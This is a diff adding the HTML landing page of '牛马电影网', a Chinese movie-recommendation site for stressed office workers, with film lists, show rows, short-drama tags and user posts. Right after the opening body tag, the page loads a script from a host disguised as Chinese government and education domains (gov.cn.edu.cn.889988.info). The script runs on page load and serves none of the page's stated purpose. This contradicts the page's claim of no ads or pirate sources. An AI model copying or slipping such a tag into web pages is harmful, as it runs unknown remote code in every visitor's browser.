@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>牛马电影网 - 打工人专属解压片库 动作爽片/逆袭短剧/搞笑综艺 在线观看导航</title>
+<meta name="description" content="牛马电影网（wumadianyingwang-h5）为打工人提供解压影视导航：动作爽片、逆袭短剧、搞笑综艺、热血竞技在线观看推荐。上班当牛做马，下班看片解压，移动端自适应，必应收录友好。">
+<meta name="keywords" content="牛马电影网, wumadianyingwang-h5, 打工人电影, 解压片库, 动作爽片, 逆袭短剧, 搞笑综艺, 战神归来, 职场解压">
+<meta name="author" content="牛马电影网">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --bg:#0a0b10;
+  --bg2:#12131c;
+  --panel:#181a26;
+  --line:#2a2d3a;
+  --orange:#ff6a00;
+  --yellow:#fff200;
+  --blue:#1a5cff;
+  --cyan:#00e5ff;
+  --muted:#8a8fa3;
+  --txt:#e8e9f0;
+  --white:#ffffff;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(800px 500px at 92% 8%,rgba(255,106,0,.15),transparent 60%),
+    radial-gradient(600px 400px at 8% 12%,rgba(26,92,255,.12),transparent 58%),
+    var(--bg);
+  color:var(--txt);line-height:1.8;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;background-image:url("data:image/svg+xml,%3Csvg width='60' height='60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.015'%3E%3Ccircle cx='30' cy='30' r='1'/%3E%3C/g%3E%3C/svg%3E")}
+a{color:var(--orange);text-decoration:none;transition:.3s}
+a:hover{color:var(--yellow)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 18px;position:relative;z-index:2}
+
+/* 顶栏 */
+.bar{position:sticky;top:0;z-index:50;background:rgba(10,11,16,.9);backdrop-filter:blur(12px);border-bottom:2px solid var(--orange)}
+.bar-in{display:flex;align-items:center;justify-content:space-between;height:60px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:900;letter-spacing:1px}
+.logo-mark{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--orange),var(--yellow));display:grid;place-items:center;font-size:20px;box-shadow:0 4px 15px rgba(255,106,0,.4)}
+.brand-text{font-size:16px}
+.brand-text b{color:var(--orange)}
+.brand-text i{font-style:normal;font-size:9px;letter-spacing:3px;color:var(--muted);display:block;font-family:ui-monospace,Consolas,monospace}
+.nav{display:flex;gap:4px;list-style:none}
+.nav a{padding:8px 14px;font-size:13px;font-weight:700;color:var(--txt);border-radius:6px;border:1px solid transparent}
+.nav a:hover,.nav a.active{background:var(--orange);color:#fff;border-color:var(--orange)}
+.burger{display:none;background:none;border:none;color:var(--yellow);font-size:24px;cursor:pointer}
+
+/* Hero */
+.hero{padding:70px 0 50px;text-align:center;position:relative;z-index:2}
+.shift-badge{font-size:12px;letter-spacing:3px;color:#0a0b10;background:var(--yellow);padding:6px 16px;border-radius:4px;font-weight:800;display:inline-block;transform:rotate(-1deg)}
+.hero h1{font-size:clamp(30px,7vw,54px);font-weight:900;letter-spacing:2px;margin:18px 0 14px;text-transform:uppercase}
+.hero h1 .o{color:var(--orange)}
+.hero h1 .y{color:var(--yellow)}
+.hero p{max-width:620px;margin:0 auto 24px;color:var(--muted);font-size:15px}
+.mood-tags{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:28px}
+.mood{font-size:13px;font-weight:800;padding:8px 18px;border-radius:6px;border:2px solid var(--line);color:var(--txt)}
+.mood.fire{color:#fff;background:var(--orange);border-color:var(--orange)}
+.mood.yellow{color:#0a0b10;background:var(--yellow);border-color:var(--yellow)}
+.mood.blue{color:#fff;background:var(--blue);border-color:var(--blue)}
+.mood.cyan{color:#0a0b10;background:var(--cyan);border-color:var(--cyan)}
+.cta-btn{display:inline-block;padding:14px 40px;border-radius:8px;font-weight:900;letter-spacing:2px;font-size:16px;color:#fff;background:linear-gradient(135deg,var(--orange),var(--blue));box-shadow:0 8px 25px rgba(255,106,0,.35)}
+.cta-btn:hover{transform:translateY(-2px);color:#fff}
+
+/* 区块通用 */
+.section{padding:50px 0;position:relative;z-index:2}
+.head{display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid var(--line);padding-bottom:12px;margin-bottom:24px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:2px}
+.head h2::before{content:"⚡ ";color:var(--yellow)}
+.head a{font-size:13px;color:var(--muted)}
+.head a:hover{color:var(--orange)}
+
+/* 解压片大卡 */
+.decompress{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:18px}
+.card{position:relative;border:2px solid var(--line);border-radius:12px;overflow:hidden;background:var(--panel);transition:.3s}
+.card:hover{transform:translateY(-5px);border-color:var(--orange);box-shadow:0 15px 35px rgba(0,0,0,.5)}
+.card .ribbon{position:absolute;top:12px;right:12px;font-size:11px;font-weight:800;padding:4px 12px;border-radius:4px;background:var(--orange);color:#fff;font-family:ui-monospace,Consolas,monospace;z-index:2}
+.card .ribbon.chill{background:var(--blue)}
+.card .ribbon.laugh{background:var(--yellow);color:#0a0b10}
+.card .thumb{height:160px;display:grid;place-items:center;font-size:48px;background:linear-gradient(135deg,#1e2030,#0a0b10)}
+.card .info{padding:16px}
+.card h3{font-size:18px;margin-bottom:6px}
+.card p{font-size:13px;color:var(--muted);margin-bottom:10px}
+.card .why{font-size:12px;color:var(--yellow);background:rgba(255,242,0,.08);padding:6px 10px;border-radius:4px;border-left:3px solid var(--yellow)}
+.card .watch{margin-top:12px;display:inline-flex;align-items:center;gap:8px;font-size:14px;font-weight:800;color:var(--orange)}
+.card .watch::before{content:"▶";background:var(--orange);color:#fff;width:28px;height:28px;border-radius:4px;display:grid;place-items:center;font-size:12px}
+
+/* 爽片网格 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:14px}
+.tile{border:2px solid var(--line);border-radius:10px;overflow:hidden;background:var(--panel);transition:.3s}
+.tile:hover{transform:scale(1.02);border-color:var(--yellow)}
+.tile .icon{height:110px;display:grid;place-items:center;font-size:40px;background:linear-gradient(160deg,#1a1c2a,#0a0b10)}
+.tile .info{padding:12px}
+.tile .tag{font-size:10px;font-weight:800;color:var(--blue);font-family:ui-monospace,Consolas,monospace;text-transform:uppercase}
+.tile h4{font-size:15px;margin:4px 0 2px}
+.tile p{font-size:12px;color:var(--muted)}
+
+/* 综艺条 */
+.variety{display:flex;flex-direction:column;gap:12px}
+.var-item{display:grid;grid-template-columns:80px 1fr 140px;gap:16px;align-items:center;background:var(--panel);border:2px solid var(--line);border-radius:10px;padding:14px 18px;transition:.3s}
+.var-item:hover{border-color:var(--cyan);background:linear-gradient(90deg,var(--panel),#141620)}
+.var-item .duration{font-family:ui-monospace,Consolas,monospace;font-size:12px;font-weight:800;color:var(--cyan);text-align:center}
+.var-item h4{font-size:16px}
+.var-item p{font-size:13px;color:var(--muted)}
+.var-item .type{font-size:12px;font-weight:800;padding:5px 12px;border-radius:4px;border:2px solid var(--orange);color:var(--orange);text-align:center}
+.var-item .type.fun{color:var(--yellow);border-color:var(--yellow)}
+.var-item .type.game{color:var(--cyan);border-color:var(--cyan)}
+
+/* 短剧双列 */
+.dual{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.col{border:2px solid var(--line);border-radius:14px;padding:20px;background:var(--bg2)}
+.col.power{border-top:4px solid var(--orange)}
+.col.sweet{border-top:4px solid var(--cyan)}
+.col h3{font-size:18px;letter-spacing:1px;margin-bottom:14px}
+.col.power h3{color:var(--orange)}
+.col.sweet h3{color:var(--cyan)}
+.tags-list{display:flex;flex-wrap:wrap;gap:8px}
+.tag-btn{font-size:13px;padding:8px 16px;border-radius:6px;border:2px solid var(--line);color:var(--txt);cursor:pointer;transition:.3s}
+.tag-btn:hover{border-color:var(--orange);color:var(--orange);background:rgba(255,106,0,.05)}
+
+/* 牛马社区 */
+.feed{display:flex;flex-direction:column;gap:14px}
+.post{background:var(--panel);border:2px solid var(--line);border-radius:10px;padding:16px 20px;transition:.3s}
+.post:hover{border-color:var(--yellow)}
+.post .author{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.post .avatar{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--blue));display:grid;place-items:center;font-size:14px;color:#fff;font-weight:800}
+.post .name{font-size:14px;font-weight:800}
+.post .time{font-size:11px;color:var(--muted);margin-left:auto}
+.post .content{font-size:14px;color:#c8cbe0;line-height:1.7}
+.post .content b{color:var(--yellow)}
+.post .react{display:flex;gap:16px;margin-top:10px;font-size:12px;color:var(--muted)}
+.post .react span:hover{color:var(--orange);cursor:pointer}
+
+/* 关于 */
+.manifesto{max-width:840px;margin:0 auto;background:var(--panel);border:2px solid var(--line);border-left:6px solid var(--orange);border-radius:12px;padding:32px}
+.manifesto h3{font-size:20px;margin-bottom:14px;letter-spacing:1px;color:var(--orange)}
+.manifesto p{font-size:15px;color:#b8bcd0;margin-bottom:12px;line-height:1.8}
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;margin-top:20px}
+.stat-card{border:2px solid var(--line);border-radius:10px;padding:16px;text-align:center;background:var(--bg2)}
+.stat-card b{display:block;font-size:24px;color:var(--yellow)}
+.stat-card span{font-size:12px;color:var(--muted)}
+.links-row{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap}
+.links-row a{padding:8px 18px;border:2px solid var(--line);border-radius:6px;font-size:13px;color:var(--txt)}
+.links-row a:hover{border-color:var(--orange);color:var(--orange)}
+
+/* 页脚 */
+.foot{border-top:2px solid var(--line);padding:36px 18px;text-align:center;color:var(--muted);font-size:13px;position:relative;z-index:2}
+.foot .title{font-size:18px;font-weight:900;color:var(--txt);letter-spacing:2px;margin-bottom:10px}
+.foot .domain{color:var(--yellow)}
+
+@media(max-width:900px){.dual{grid-template-columns:1fr}}
+@media(max-width:768px){
+  .nav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(10,11,16,.98);border-bottom:2px solid var(--orange);padding:10px 16px}
+  .nav.open{display:flex}.nav a{padding:12px 16px}
+  .burger{display:block}
+}
+@media(max-width:520px){
+  .hero{padding:44px 0 32px}
+  .section{padding:32px 0}
+  .decompress{grid-template-columns:1fr}
+  .grid{grid-template-columns:1fr 1fr;gap:10px}
+  .tile .icon{height:90px;font-size:30px}
+  .var-item{grid-template-columns:60px 1fr;gap:10px;padding:12px}
+  .var-item .type{grid-column:2;justify-self:start}
+  .post .content{font-size:13px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="wrap bar-in">
+    <div class="brand"><span class="logo-mark">🐂</span><div class="brand-text">牛马电影网<b>WUMA</b><i>WUMADIANYINGWANG-H5</i></div></div>
+    <ul class="nav" id="nav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#cool">爽片库</a></li>
+      <li><a href="#variety">综艺整活</a></li>
+      <li><a href="#short">短剧狂飙</a></li>
+      <li><a href="#community">牛马社区</a></li>
+      <li><a href="#about">放映室</a></li>
+    </ul>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<header class="hero wrap" id="home">
+  <span class="shift-badge">🔨 打工人的第 N 个夜班 · 该解压了</span>
+  <h1><span class="o">牛马</span>电影网<span class="y">在线</span></h1>
+  <p>wumadianyingwang-h5 · 上班当牛做马，下班看片解压。动作爽片、逆袭短剧、搞笑综艺一站导航，不费脑、够过瘾、手机点开就看。</p>
+  <div class="mood-tags">
+    <span class="mood fire">🔥 解压爽片</span>
+    <span class="mood yellow">😂 搞笑综艺</span>
+    <span class="mood blue">⚔️ 逆袭打脸</span>
+    <span class="mood cyan">🏆 热血竞技</span>
+  </div>
+  <a href="#cool" class="cta-btn">开始解压 →</a>
+</header>
+
+<section class="section wrap" id="today">
+  <div class="head"><h2>今日解压片 / 牛马下班必看</h2><a href="#">换一批 →</a></div>
+  <div class="decompress">
+    <div class="card">
+      <span class="ribbon">爽到飞起</span>
+      <div class="thumb">🥊</div>
+      <div class="info">
+        <h3>怒火·重案 2</h3>
+        <p>动作 / 警匪 / 拳拳到肉</p>
+        <div class="why">💬 上班被骂？看甄子丹暴打反派，替你出气</div>
+        <span class="watch">立即观看</span>
+      </div>
+    </div>
+    <div class="card">
+      <span class="ribbon laugh">笑出腹肌</span>
+      <div class="thumb">🤡</div>
+      <div class="info">
+        <h3>年会不能停！2</h3>
+        <p>喜剧 / 职场 / 打工人嘴替</p>
+        <div class="why">💬 比你的年终总结还好笑，看完明天上班不生气</div>
+        <span class="watch">立即观看</span>
+      </div>
+    </div>
+    <div class="card">
+      <span class="ribbon chill">倍速看完</span>
+      <div class="thumb">👑</div>
+      <div class="info">
+        <h3>战神归来：龙帅出山</h3>
+        <p>短剧 / 逆袭 / 打脸爽文</p>
+        <div class="why">💬 3分钟打脸一次，比咖啡提神</div>
+        <span class="watch">立即观看</span>
+      </div>
+    </div>
+    <div class="card">
+      <span class="ribbon">热血拉满</span>
+      <div class="thumb">🏎️</div>
+      <div class="info">
+        <h3>飞驰人生 3</h3>
+        <p>运动 / 赛车 / 热血燃向</p>
+        <div class="why">💬 沈腾教你：就算中年也能再飙一把</div>
+        <span class="watch">立即观看</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section wrap" id="cool">
+  <div class="head"><h2>爽片库 / ACTION & POWER</h2><a href="#">更多爽片 →</a></div>
+  <div class="grid">
+    <div class="tile"><div class="icon">🔫</div><div class="info"><div class="tag">动作·枪战</div><h4>碟中谍 8</h4><p>阿汤哥最后之舞</p></div></div>
+    <div class="tile"><div class="icon">🦹</div><div class="info"><div class="tag">超级英雄</div><h4>死侍与金刚狼3</h4><p>嘴炮+暴力+笑料</p></div></div>
+    <div class="tile"><div class="icon">🐉</div><div class="info"><div class="tag">武侠·古装</div><h4>绣春刀 3</h4><p>明末锦衣卫热血</p></div></div>
+    <div class="tile"><div class="icon">💣</div><div class="info"><div class="tag">军事·战争</div><h4>红海行动 2</h4><p>硬核军事爽片</p></div></div>
+    <div class="tile"><div class="icon">🏹</div><div class="info"><div class="tag">悬疑·犯罪</div><h4>消失的她 2</h4><p>反转再反转</p></div></div>
+    <div class="tile"><div class="icon">🥋</div><div class="info"><div class="tag">格斗·竞技</div><h4>叶问 5</h4><p>咏春最后一战</p></div></div>
+    <div class="tile"><div class="icon">🚓</div><div class="info"><div class="tag">警匪·追车</div><h4>速度与激情 11</h4><p>全家福最终章</p></div></div>
+    <div class="tile"><div class="icon">⛏️</div><div class="info"><div class="tag">冒险·夺宝</div><h4>盗墓笔记·终章</h4><p>铁三角终极冒险</p></div></div>
+  </div>
+</section>
+
+<section class="section wrap" id="variety" style="background:linear-gradient(180deg,transparent,rgba(0,229,255,.04))">
+  <div class="head"><h2>综艺整活 / VARIETY SHOWS</h2><a href="#">全部综艺 →</a></div>
+  <div class="variety">
+    <div class="var-item"><div class="duration">90min</div><div><h4>一年一度喜剧大赛 4</h4><p>喜剧 / 脱口秀 / 脑洞大开</p></div><span class="type fun">搞笑解压</span></div>
+    <div class="var-item"><div class="duration">120min</div><div><h4>奔跑吧·特别季</h4><p>户外竞技 / 明星互坑</p></div><span class="type">竞技热血</span></div>
+    <div class="var-item"><div class="duration">60min</div><div><h4>大侦探 9</h4><p>推理 / 角色扮演 / 烧脑</p></div><span class="type game">烧脑放松</span></div>
+    <div class="var-item"><div class="duration">45min</div><div><h4>向往的生活 7</h4><p>慢综艺 / 田园治愈</p></div><span class="type fun">治愈放松</span></div>
+    <div class="var-item"><div class="duration">75min</div><div><h4>这就是街舞 6</h4><p>街舞 / 竞技 / 燃炸舞台</p></div><span class="type">热血燃向</span></div>
+  </div>
+</section>
+
+<section class="section wrap" id="short">
+  <div class="head"><h2>短剧狂飙 / SHORT DRAMA</h2><a href="#">更多短剧 →</a></div>
+  <div class="dual">
+    <div class="col power">
+      <h3>⚔️ 逆袭打脸区</h3>
+      <div class="tags-list">
+        <span class="tag-btn">战神归来</span><span class="tag-btn">龙帅出山</span><span class="tag-btn">赘婿翻身</span>
+        <span class="tag-btn">神医下山</span><span class="tag-btn">兵王回归</span><span class="tag-btn">豪门弃少</span>
+        <span class="tag-btn">绝世高手</span><span class="tag-btn">无敌从离婚开始</span>
+      </div>
+    </div>
+    <div class="col sweet">
+      <h3>💕 甜宠轻松区</h3>
+      <div class="tags-list">
+        <span class="tag-btn">先婚后爱</span><span class="tag-btn">霸总追妻</span><span class="tag-btn">青梅竹马</span>
+        <span class="tag-btn">契约婚姻</span><span class="tag-btn">重生甜宠</span><span class="tag-btn">校园恋爱</span>
+        <span class="tag-btn">萌宝助攻</span><span class="tag-btn">闪婚老公太宠我</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section wrap" id="community" style="background:linear-gradient(180deg,transparent,rgba(255,106,0,.04))">
+  <div class="head"><h2>牛马社区 / WORKER REVIEWS</h2><a href="#">发帖 →</a></div>
+  <div class="feed">
+    <div class="post">
+      <div class="author"><div class="avatar">搬</div><div class="name">搬砖小王</div><div class="time">2小时前</div></div>
+      <div class="content">今天被甲方改了8版方案，晚上看了<b>《年会不能停！2》</b>，笑到隔壁室友来敲门。建议所有打工人列入必看清单 💯</div>
+      <div class="react"><span>👍 234</span><span>💬 56</span><span>🔁 分享</span></div>
+    </div>
+    <div class="post">
+      <div class="author"><div class="avatar">码</div><div class="name">码农不秃</div><div class="time">5小时前</div></div>
+      <div class="content">连续加班一周，睡前刷了<b>《战神归来》</b>前20集，每集3分钟打脸一次，比褪黑素好使。短剧才是当代牛马的安眠药 🛌</div>
+      <div class="react"><span>👍 189</span><span>💬 42</span><span>🔁 分享</span></div>
+    </div>
+    <div class="post">
+      <div class="author"><div class="avatar">设</div><div class="name">设计不睡</div><div class="time">昨天</div></div>
+      <div class="content">推荐<b>《一年一度喜剧大赛4》</b>最新一期，那个"甲方乙方"sketch直接演出了我的日常，看完又有力气改第9版了（不是）😭</div>
+      <div class="react"><span>👍 312</span><span>💬 78</span><span>🔁 分享</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="section wrap" id="about">
+  <div class="head"><h2>牛马放映室宣言</h2></div>
+  <div class="manifesto">
+    <h3>🐂 "上班当牛做马，下班看片解压。"</h3>
+    <p>牛马电影网（wumadianyingwang-h5）是打工人自己的影视导航站：帮你从海量片源里挑出真正"解压、爽、不费脑"的内容。动作爽片出气、搞笑综艺开怀、逆袭短剧提神、甜宠恋爱治愈——上班受的委屈，这里帮你找回来。</p>
+    <p>本站不存储、不分发视频文件，不内置盗版播放源。所有推荐均为公开信息整理，如涉及版权问题请联系处理。</p>
+    <div class="stats-row">
+      <div class="stat-card"><b>8+</b><span>解压频道</span></div>
+      <div class="stat-card"><b>每日</b><span>牛马片单更新</span></div>
+      <div class="stat-card"><b>手机优先</b><span>单页秒开</span></div>
+      <div class="stat-card"><b>0</b><span>弹窗广告 / 盗版源</span></div>
+    </div>
+    <div class="links-row">
+      <a href="#">动作爽片</a><a href="#">搞笑综艺</a><a href="#">逆袭短剧</a><a href="#">甜宠恋爱</a><a href="#">热血竞技</a><a href="#">牛马社区</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="title">牛马电影网 · WUMADIANYINGWANG-H5</div>
+  <p><a href="#home">首页</a> | <a href="#cool">爽片库</a> | <a href="#variety">综艺整活</a> | <a href="#short">短剧狂飙</a> | <a href="#community">牛马社区</a></p>
+  <p>官网：<span class="domain">https://wumadianyingwang-h5.github.io</span></p>
+  <p>© 2026 牛马电影网 · 打工人自己的解压片库。</p>
+</footer>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger&&burger.addEventListener('click',()=>nav.classList.toggle('open'));
+const secs=document.querySelectorAll('section[id],header[id]');
+const links=nav.querySelectorAll('a');
+addEventListener('scroll',()=>{let cur='home';secs.forEach(s=>{if(scrollY>=s.offsetTop-90)cur=s.id});links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')})});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'});nav.classList.remove('open')})});
+</script>
+</body>
+</html>
